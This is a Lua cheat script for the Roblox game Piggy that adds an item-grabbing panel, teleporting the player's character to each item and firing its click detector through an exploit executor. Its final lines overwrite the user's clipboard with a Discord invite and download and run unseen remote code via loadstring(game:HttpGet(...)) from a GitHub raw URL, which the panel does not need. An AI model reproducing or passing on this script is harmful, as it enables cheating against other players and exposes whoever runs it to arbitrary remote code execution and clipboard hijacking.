local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local player = Players.LocalPlayer

local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Parent = game:GetService("CoreGui")

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Parent = PiggyGui
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 5, 0)

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.Parent = ScrollingFrame
UIGridLayout.CellSize = UDim2.new(0, 90, 0, 90)

local itemCache, frameCache = {}, {}
local isDragging, dragStart, startPos

local function updateDrag(input)
    local delta = input.Position - dragStart
    ScrollingFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

ScrollingFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDragging = true
        dragStart = input.Position
        startPos = ScrollingFrame.Position
    end
end)

ScrollingFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        updateDrag(input)
    end
end)

local function createItemFrame(item)
    local itemPos = item.Position
    local ItemFrame = Instance.new("TextButton")
    ItemFrame.Parent = ScrollingFrame
    ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    ItemFrame.BackgroundTransparency = 0.95
    ItemFrame.Size = UDim2.new(0, 100, 0, 100)
    ItemFrame.Text = ""

    local Viewport = Instance.new("ViewportFrame")
    Viewport.Parent = ItemFrame
    Viewport.Size = UDim2.new(1, 0, 1, 0)
    Viewport.BackgroundTransparency = 1

    local clone = item:Clone()
    clone.Parent = Viewport

    local camera = Instance.new("Camera")
    camera.Parent = Viewport
    camera.CameraType = Enum.CameraType.Fixed
    camera.CFrame = CFrame.new(itemPos + Vector3.new(0, 3, 0), itemPos)
    Viewport.CurrentCamera = camera

    ItemFrame.MouseButton1Down:Connect(function()
        if item:FindFirstChild("ClickDetector") then
            local originalPos = player.Character.HumanoidRootPart.CFrame
            player.Character.HumanoidRootPart.CFrame = item.CFrame
            task.wait(0.1)
            fireclickdetector(item.ClickDetector)
            task.wait(0.3)
            player.Character.HumanoidRootPart.CFrame = originalPos
        end
    end)
    frameCache[item] = ItemFrame
    local function update()
        ItemFrame.Visible = item.Transparency < 1
        if ItemFrame.Visible then
            for _, child in ipairs(Viewport:GetChildren()) do
                if child:IsA("Model") or child:IsA("Part") then
                    child:Destroy()
                end
            end
            local clone = item:Clone()
            clone.Parent = Viewport
            camera.CFrame = CFrame.new(itemPos + Vector3.new(0, 3, 0), itemPos)
        end
    end
    update()
    item:GetPropertyChangedSignal("Transparency"):Connect(update)
end

local function onItemAdded(item)
    local hasClickDetector = item.Parent:FindFirstChild("ClickDetector")
    local hasClickEvent = item.Parent:FindFirstChild("ClickEvent")
    if (item.Name == "ItemPickupScript" or item.Name == "NewItemPickupScript") or 
       (hasClickDetector and hasClickEvent) and 
       not itemCache[item.Parent] then
        itemCache[item.Parent] = true
        createItemFrame(item.Parent)
    end
end

local function onItemRemoved(item)
    if itemCache[item.Parent] and frameCache[item.Parent] then
        frameCache[item.Parent]:Destroy()
        itemCache[item.Parent], frameCache[item.Parent] = nil, nil
    end
end

game:GetService("Workspace").DescendantAdded:Connect(onItemAdded)
game:GetService("Workspace").DescendantRemoving:Connect(onItemRemoved)

for _, item in pairs(Workspace:GetDescendants()) do
    onItemAdded(item)
end

game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "https://discord.gg/R2dbGKyqqE",
	Text = "Join our community!",
	Duration = 25;
})
loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
setclipboard("https://discord.gg/R2dbGKyqqE")
